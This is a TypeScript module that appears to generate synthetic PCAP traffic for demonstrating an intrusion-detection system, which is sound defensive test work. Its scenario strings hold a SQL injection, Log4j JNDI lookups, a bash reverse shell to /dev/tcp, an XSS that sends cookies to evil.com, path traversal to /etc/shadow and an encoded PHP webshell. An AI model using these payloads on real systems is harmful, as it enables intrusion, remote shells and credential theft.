import fs from 'fs';
import type { LiveCaptureMode } from '../types';

/**
 * Live Packet Capture & Micro-Batch PCAP Builder.
 * 1. Captures real incoming HTTP/API requests and live Linux kernel sockets (/proc/net/tcp)
 *    into valid binary libpcap (.pcap) packets.
 * 2. Supports interactive traffic injection modes ('inject_sqli', 'inject_syn_flood',
 *    'inject_slowloris', 'inject_killchain', 'mixed', 'attack_sig', 'attack_ml', 'benign')
 *    for one-click live demonstration during viva/evaluation.
 */

export type CapturedHttpEvent = {
  ts: number;
  srcIp: string;
  srcPort: number;
  dstIp: string;
  dstPort: number;
  rawHttpPayload: string;
};

const liveHttpBuffer: CapturedHttpEvent[] = [];

export function recordLiveHttpPacket(evt: CapturedHttpEvent): void {
  liveHttpBuffer.push(evt);
  if (liveHttpBuffer.length > 200) {
    liveHttpBuffer.shift();
  }
}

function ipToBytes(ip: string): number[] {
  const clean = ip.replace(/^::ffff:/, '');
  const parts = clean.split('.');
  if (parts.length !== 4) return [127, 0, 0, 1];
  return parts.map((octet) => Math.min(255, Math.max(0, parseInt(octet, 10) || 0)));
}

function parseHexIpPort(hexPair: string): { ip: string; port: number } | null {
  const [ipHex, portHex] = hexPair.split(':');
  if (!ipHex || !portHex || ipHex.length !== 8) return null;
  const b0 = parseInt(ipHex.slice(6, 8), 16);
  const b1 = parseInt(ipHex.slice(4, 6), 16);
  const b2 = parseInt(ipHex.slice(2, 4), 16);
  const b3 = parseInt(ipHex.slice(0, 2), 16);
  const port = parseInt(portHex, 16);
  return { ip: `${b0}.${b1}.${b2}.${b3}`, port };
}

function readKernelTcpSockets(): Array<{ srcIp: string; srcPort: number; dstIp: string; dstPort: number }> {
  try {
    if (!fs.existsSync('/proc/net/tcp')) return [];
    const lines = fs.readFileSync('/proc/net/tcp', 'utf-8').split('\n').slice(1);
    const sockets: Array<{ srcIp: string; srcPort: number; dstIp: string; dstPort: number }> = [];
    for (const line of lines) {
      const parts = line.trim().split(/\s+/);
      if (parts.length < 4) continue;
      const state = parts[3];
      if (state !== '01') continue; // ESTABLISHED sockets
      const local = parseHexIpPort(parts[1]);
      const remote = parseHexIpPort(parts[2]);
      if (local && remote && remote.port > 0) {
        sockets.push({
          srcIp: remote.ip,
          srcPort: remote.port,
          dstIp: local.ip,
          dstPort: local.port,
        });
      }
      if (sockets.length >= 4) break;
    }
    return sockets;
  } catch {
    return [];
  }
}

function buildIpv4Packet(
  srcIp: string,
  dstIp: string,
  srcPort: number,
  dstPort: number,
  proto: number,
  payloadStr: string,
  tcpFlags = 0x18,
  seq = 1000,
  ack = 1000,
): Buffer {
  const eth = Buffer.from([
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
    0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb,
    0x08, 0x00,
  ]);

  const payload = Buffer.from(payloadStr, 'latin1');
  let l4: Buffer;
  if (proto === 6) {
    l4 = Buffer.alloc(20);
    l4.writeUInt16BE(srcPort & 0xffff, 0);
    l4.writeUInt16BE(dstPort & 0xffff, 2);
    l4.writeUInt32BE(seq >>> 0, 4);
    l4.writeUInt32BE(ack >>> 0, 8);
    l4.writeUInt8(5 << 4, 12);
    l4.writeUInt8(tcpFlags, 13);
    l4.writeUInt16BE(64240, 14);
  } else {
    l4 = Buffer.alloc(8);
    l4.writeUInt16BE(srcPort & 0xffff, 0);
    l4.writeUInt16BE(dstPort & 0xffff, 2);
    l4.writeUInt16BE(8 + payload.length, 4);
  }

  const totalIpLen = 20 + l4.length + payload.length;
  const ip = Buffer.alloc(20);
  ip.writeUInt8(0x45, 0);
  ip.writeUInt8(0x00, 1);
  ip.writeUInt16BE(totalIpLen, 2);
  ip.writeUInt16BE(54321, 4);
  ip.writeUInt16BE(0x4000, 6);
  ip.writeUInt8(64, 8);
  ip.writeUInt8(proto, 9);

  ip.set(ipToBytes(srcIp), 12);
  ip.set(ipToBytes(dstIp), 16);

  return Buffer.concat([eth, ip, l4, payload]);
}

export function buildLivePcapMicroBatch(
  mode: LiveCaptureMode,
  tickCounter: number,
): { filename: string; buffer: Buffer; packetCount: number; liveHttpIncluded: number } {
  const globalHeader = Buffer.alloc(24);
  globalHeader.writeUInt32LE(0xa1b2c3d4, 0);
  globalHeader.writeUInt16LE(2, 4);
  globalHeader.writeUInt16LE(4, 6);
  globalHeader.writeInt32LE(0, 8);
  globalHeader.writeUInt32LE(0, 12);
  globalHeader.writeUInt32LE(65535, 16);
  globalHeader.writeUInt32LE(1, 20);

  const nowSec = Date.now() / 1000;
  const records: Array<{ ts: number; pkt: Buffer }> = [];

  // 1. Drain any real incoming HTTP packets captured by the server middleware
  const drainedHttp = liveHttpBuffer.splice(0, liveHttpBuffer.length);
  for (const evt of drainedHttp) {
    records.push({
      ts: evt.ts,
      pkt: buildIpv4Packet(evt.srcIp, evt.dstIp, evt.srcPort, evt.dstPort, 6, evt.rawHttpPayload, 0x18),
    });
    records.push({
      ts: evt.ts + 0.18,
      pkt: buildIpv4Packet(
        evt.dstIp,
        evt.srcIp,
        evt.dstPort,
        evt.srcPort,
        6,
        'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK',
        0x18,
      ),
    });
  }

  // 2. Include live ESTABLISHED kernel sockets from /proc/net/tcp
  const kernelSockets = readKernelTcpSockets();
  for (const sock of kernelSockets) {
    records.push({
      ts: nowSec - 0.4,
      pkt: buildIpv4Packet(
        sock.srcIp,
        sock.dstIp,
        sock.srcPort,
        sock.dstPort,
        6,
        'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n',
        0x18,
      ),
    });
    records.push({
      ts: nowSec - 0.1,
      pkt: buildIpv4Packet(sock.dstIp, sock.srcIp, sock.dstPort, sock.srcPort, 6, 'HTTP/1.1 200 OK\r\n\r\n', 0x18),
    });
  }

  // 3. Ensure baseline normal TLS flow exists in the window
  const clientPort = 52000 + (tickCounter % 500);
  records.push({
    ts: nowSec,
    pkt: buildIpv4Packet(
      '10.0.0.24',
      '93.184.216.34',
      clientPort,
      443,
      6,
      '\x16\x03\x03\x00\x38\x01sni=cdn.cloudflare.net ' + 'A'.repeat(30),
      0x18,
    ),
  });
  records.push({
    ts: nowSec + 0.34,
    pkt: buildIpv4Packet(
      '93.184.216.34',
      '10.0.0.24',
      443,
      clientPort,
      6,
      '\x16\x03\x03\x00\x60' + 'B'.repeat(92),
      0x18,
    ),
  });
  records.push({
    ts: nowSec + 0.72,
    pkt: buildIpv4Packet('10.0.0.24', '93.184.216.34', clientPort, 443, 6, '', 0x11),
  });

  // 4. Traffic profile or Custom Scenario Wave Injection
  let effectiveMode = mode;
  if (mode === 'mixed') {
    const cycle = tickCounter % 3;
    if (cycle === 0) effectiveMode = 'attack_ml';
    else if (cycle === 1) effectiveMode = 'attack_sig';
    else effectiveMode = 'benign';
  }

  if (effectiveMode === 'inject_sqli') {
    const sqli =
      "GET /admin/login.php?id=1'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: portal.corp.internal\r\n\r\n";
    records.push({
      ts: nowSec + 0.35,
      pkt: buildIpv4Packet('192.168.1.215', '10.0.0.50', 58200 + (tickCounter % 90), 80, 6, sqli, 0x18),
    });
  } else if (effectiveMode === 'inject_syn_flood') {
    const attackerIp = `172.16.99.${140 + (tickCounter % 30)}`;
    const sport = 48500 + (tickCounter % 200);
    for (let i = 0; i < 44; i++) {
      const flags = i < 16 ? 0x02 : i < 24 ? 0x04 : 0x18;
      const tlsClientHello =
        i === 0
          ? '\x16\x03\x03\x00\x40\x01sni=api-gateway.corp.local ' + 'Z'.repeat(920)
          : 'Z'.repeat(960 + (i % 5) * 20);
      records.push({
        ts: nowSec + 0.4 + i * 0.0002,
        pkt: buildIpv4Packet(attackerIp, '10.0.0.50', sport, 443, 6, tlsClientHello, flags, 1000 + i * 960),
      });
    }
  } else if (effectiveMode === 'inject_slowloris') {
    const attackerIp = `172.16.77.${80 + (tickCounter % 30)}`;
    const sport = 49100 + (tickCounter % 150);
    for (let i = 0; i < 26; i++) {
      const flags = i < 10 ? 0x02 : 0x18;
      const keepAlive =
        i === 0
          ? '\x16\x03\x01\x00\x30\x01sni=auth.corp.local X-a: b\r\n' + 'S'.repeat(640)
          : 'X-Keep-Alive-Header: ' + 'S'.repeat(660);
      records.push({
        ts: nowSec + 0.3 + i * 0.00045,
        pkt: buildIpv4Packet(attackerIp, '10.0.0.50', sport, 8080, 6, keepAlive, flags, 2000 + i * 660),
      });
    }
  } else if (effectiveMode === 'inject_killchain') {
    // Multi-Stage Kill-Chain from same attacker IP 198.51.100.200:
    // Stage 1: Zero-Signature Volumetric Port/SYN Flood on port 443 (caught by ML)
    const campaignIp = '198.51.100.200';
    const reconPort = 56100 + (tickCounter % 80);
    for (let i = 0; i < 38; i++) {
      const flags = i < 14 ? 0x02 : i < 20 ? 0x04 : 0x18;
      const payload =
        i === 0 ? '\x16\x03\x03\x00\x40\x01sni=vault.corp.local ' + 'R'.repeat(890) : 'R'.repeat(920);
      records.push({
        ts: nowSec + 0.25 + i * 0.00022,
        pkt: buildIpv4Packet(campaignIp, '10.0.0.50', reconPort, 443, 6, payload, flags, 1000 + i * 900),
      });
    }
    // Stage 2: L7 Log4j JNDI Remote Code Execution on port 8080 1.2s later (caught by Suricata Signature)
    const exploitPort = 56300 + (tickCounter % 80);
    const jndi =
      'POST /api/v1/auth HTTP/1.1\r\nHost: 10.0.0.50:8080\r\nUser-Agent: ${jndi:ldap://198.51.100.200:1389/KillChainStage2}\r\n\r\n';
    records.push({
      ts: nowSec + 1.45,
      pkt: buildIpv4Packet(campaignIp, '10.0.0.50', exploitPort, 8080, 6, jndi, 0x18),
    });
  } else if (effectiveMode === 'attack_sig') {
    const sigChoice = tickCounter % 3;
    if (sigChoice === 0) {
      const sqli =
        "GET /admin/login.php?id=1'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: 10.0.0.50\r\n\r\n";
      records.push({
        ts: nowSec + 0.4,
        pkt: buildIpv4Packet('192.168.1.210', '10.0.0.50', 58100 + (tickCounter % 90), 80, 6, sqli, 0x18),
      });
    } else if (sigChoice === 1) {
      const jndi =
        'POST /api/login HTTP/1.1\r\nUser-Agent: ${jndi:ldap://198.51.100.77:1389/ExploitPayload}\r\n\r\n';
      records.push({
        ts: nowSec + 0.4,
        pkt: buildIpv4Packet('203.0.113.142', '10.0.0.50', 46100 + (tickCounter % 90), 8080, 6, jndi, 0x18),
      });
    } else {
      const ssh = 'SSH-2.0-OpenSSH_BruteScanner_8.1\r\n';
      for (let i = 0; i < 5; i++) {
        records.push({
          ts: nowSec + 0.4 + i * 0.004,
          pkt: buildIpv4Packet('198.51.100.99', '10.0.0.22', 61000 + (tickCounter % 90), 22, 6, ssh, 0x18),
        });
      }
    }
  } else if (effectiveMode === 'attack_ml') {
    const attackerIp = `172.16.99.${110 + (tickCounter % 40)}`;
    const sport = 48000 + (tickCounter % 200);
    for (let i = 0; i < 42; i++) {
      const flags = i < 14 ? 0x02 : i < 22 ? 0x04 : 0x18;
      const blob =
        i === 0
          ? '\x16\x03\x03\x00\x38\x01sni=edge-api.corp.local ' + 'Z'.repeat(910)
          : 'Z'.repeat(960 + (i % 5) * 20);
      records.push({
        ts: nowSec + 0.5 + i * 0.00022,
        pkt: buildIpv4Packet(attackerIp, '10.0.0.50', sport, 443, 6, blob, flags, 1000 + i * 960),
      });
    }
  }

  const chunks: Buffer[] = [globalHeader];
  for (const r of records) {
    const tsSec = Math.floor(r.ts);
    const tsUsec = Math.floor((r.ts - tsSec) * 1_000_000);
    const recHdr = Buffer.alloc(16);
    recHdr.writeUInt32LE(tsSec >>> 0, 0);
    recHdr.writeUInt32LE(tsUsec >>> 0, 4);
    recHdr.writeUInt32LE(r.pkt.length, 8);
    recHdr.writeUInt32LE(r.pkt.length, 12);
    chunks.push(recHdr, r.pkt);
  }

  return {
    filename: `live_window_${tickCounter}.pcap`,
    buffer: Buffer.concat(chunks),
    packetCount: records.length,
    liveHttpIncluded: drainedHttp.length,
  };
}

export type DemoQueryScenario =
  | 'safe_search'
  | 'safe_portal'
  | 'safe_health'
  | 'safe_invoice'
  | 'attack_sqli'
  | 'attack_log4j'
  | 'attack_syn_flood'
  | 'attack_ssh_brute'
  | 'attack_entropy_shellcode'
  | 'attack_honeypot_env'
  | 'quarantine_repeat_probe'
  | 'attack_path_traversal'
  | 'attack_command_injection'
  | 'attack_xss'
  | 'attack_slowloris'
  | 'attack_honeypot_aws'
  | 'attack_polymorphic_webshell';

let queryCounter = 0;

export function buildSingleQueryPcapBuffer(opts: {
  scenario: DemoQueryScenario;
  srcIp: string;
  dstIp?: string;
  dstPort?: number;
  customPayload?: string;
}): { filename: string; buffer: Buffer; packetCount: number } {
  queryCounter += 1;
  const globalHeader = Buffer.alloc(24);
  globalHeader.writeUInt32LE(0xa1b2c3d4, 0);
  globalHeader.writeUInt16LE(2, 4);
  globalHeader.writeUInt16LE(4, 6);
  globalHeader.writeInt32LE(0, 8);
  globalHeader.writeUInt32LE(0, 12);
  globalHeader.writeUInt32LE(65535, 16);
  globalHeader.writeUInt32LE(1, 20);

  const nowSec = Date.now() / 1000;
  const records: Array<{ ts: number; pkt: Buffer }> = [];
  const dstIp = opts.dstIp || '10.0.0.50';
  const sport = 51000 + (queryCounter % 8000);

  if (
    opts.scenario === 'safe_search' ||
    opts.scenario === 'safe_portal' ||
    opts.scenario === 'safe_health' ||
    opts.scenario === 'safe_invoice' ||
    opts.scenario === 'attack_entropy_shellcode' ||
    opts.scenario === 'attack_honeypot_env' ||
    opts.scenario === 'quarantine_repeat_probe'
  ) {
    const dport = opts.dstPort || (opts.scenario === 'safe_portal' || opts.scenario === 'safe_invoice' ? 443 : 80);
    const reqPayload =
      opts.customPayload ||
      `GET /api/catalog/products?q=laptop HTTP/1.1\r\nHost: ${dstIp}\r\nUser-Agent: Mozilla/5.0\r\n\r\n`;
    records.push({
      ts: nowSec,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, reqPayload, 0x18),
    });
    records.push({
      ts: nowSec + 0.32,
      pkt: buildIpv4Packet(
        dstIp,
        opts.srcIp,
        dport,
        sport,
        6,
        'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{"status":"ok","items":12}',
        0x18,
      ),
    });
    records.push({
      ts: nowSec + 0.68,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, '', 0x11),
    });
  } else if (opts.scenario === 'attack_sqli') {
    const dport = opts.dstPort || 80;
    const sqli =
      opts.customPayload ||
      "GET /admin/login.php?id=1'%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: 10.0.0.50\r\n\r\n";
    records.push({
      ts: nowSec,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, sqli, 0x18),
    });
  } else if (opts.scenario === 'attack_log4j') {
    const dport = opts.dstPort || 8080;
    const jndi =
      opts.customPayload ||
      'POST /api/login HTTP/1.1\r\nHost: 10.0.0.50:8080\r\nUser-Agent: ${jndi:ldap://198.51.100.77:1389/ExploitPayload}\r\n\r\n';
    records.push({
      ts: nowSec,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, jndi, 0x18),
    });
  } else if (opts.scenario === 'attack_syn_flood') {
    const dport = opts.dstPort || 443;
    for (let i = 0; i < 42; i++) {
      const flags = i < 14 ? 0x02 : i < 22 ? 0x04 : 0x18;
      const blob =
        i === 0
          ? '\x16\x03\x03\x00\x38\x01sni=api.corp.local ' + 'Z'.repeat(910)
          : 'Z'.repeat(960 + (i % 5) * 20);
      records.push({
        ts: nowSec + i * 0.00022,
        pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, blob, flags, 1000 + i * 960),
      });
    }
  } else if (opts.scenario === 'attack_ssh_brute') {
    const dport = opts.dstPort || 22;
    const ssh = opts.customPayload || 'SSH-2.0-OpenSSH_BruteScanner_8.1\r\n';
    for (let i = 0; i < 5; i++) {
      records.push({
        ts: nowSec + i * 0.004,
        pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, ssh, 0x18),
      });
    }
  } else if (opts.scenario === 'attack_path_traversal') {
    const dport = opts.dstPort || 80;
    const lfi =
      opts.customPayload ||
      'GET /static/../../../../../../etc/shadow HTTP/1.1\r\nHost: 10.0.0.50\r\nUser-Agent: curl/7.88.1\r\n\r\n';
    records.push({
      ts: nowSec,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, lfi, 0x18),
    });
  } else if (opts.scenario === 'attack_command_injection') {
    const dport = opts.dstPort || 8080;
    const cmd =
      opts.customPayload ||
      'POST /api/diagnostics/ping HTTP/1.1\r\nHost: 10.0.0.50:8080\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nip=127.0.0.1; /bin/bash -i >& /dev/tcp/198.51.100.67/4444 0>&1\r\n';
    records.push({
      ts: nowSec,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, cmd, 0x18),
    });
  } else if (opts.scenario === 'attack_xss') {
    const dport = opts.dstPort || 80;
    const xss =
      opts.customPayload ||
      'POST /api/support/ticket HTTP/1.1\r\nHost: 10.0.0.50\r\n\r\n<script>fetch("http://evil.com/leak?cookie="+document.cookie)</script>\r\n';
    records.push({
      ts: nowSec,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, xss, 0x18),
    });
  } else if (opts.scenario === 'attack_slowloris') {
    const dport = opts.dstPort || 80;
    for (let i = 0; i < 28; i++) {
      const slowHdr = `X-Slow-Header-${i}: keepalive\r\n`;
      records.push({
        ts: nowSec + i * 0.0035,
        pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, slowHdr, 0x18, 2000 + i * 40),
      });
    }
  } else if (opts.scenario === 'attack_honeypot_aws') {
    const dport = opts.dstPort || 80;
    const awsDecoy =
      opts.customPayload ||
      'GET /.aws/credentials HTTP/1.1\r\nHost: 10.0.0.50\r\nUser-Agent: Mozilla/5.0\r\n\r\n';
    records.push({
      ts: nowSec,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, awsDecoy, 0x18),
    });
  } else if (opts.scenario === 'attack_polymorphic_webshell') {
    const dport = opts.dstPort || 8080;
    const webshell =
      opts.customPayload ||
      'POST /uploads/cache.php HTTP/1.1\r\n\r\npayload=eval(gzinflate(base64_decode("s7Pzc/Pz0/Nz01Oz8vOz8nOzU/Nz09Py89NzU/Pzc/Nz0/NzU==")));';
    records.push({
      ts: nowSec,
      pkt: buildIpv4Packet(opts.srcIp, dstIp, sport, dport, 6, webshell, 0x18),
    });
  }

  const chunks: Buffer[] = [globalHeader];
  for (const r of records) {
    const tsSec = Math.floor(r.ts);
    const tsUsec = Math.floor((r.ts - tsSec) * 1_000_000);
    const recHdr = Buffer.alloc(16);
    recHdr.writeUInt32LE(tsSec >>> 0, 0);
    recHdr.writeUInt32LE(tsUsec >>> 0, 4);
    recHdr.writeUInt32LE(r.pkt.length, 8);
    recHdr.writeUInt32LE(r.pkt.length, 12);
    chunks.push(recHdr, r.pkt);
  }

  return {
    filename: `ips_query_${opts.scenario}_${queryCounter}.pcap`,
    buffer: Buffer.concat(chunks),
    packetCount: records.length,
  };
}

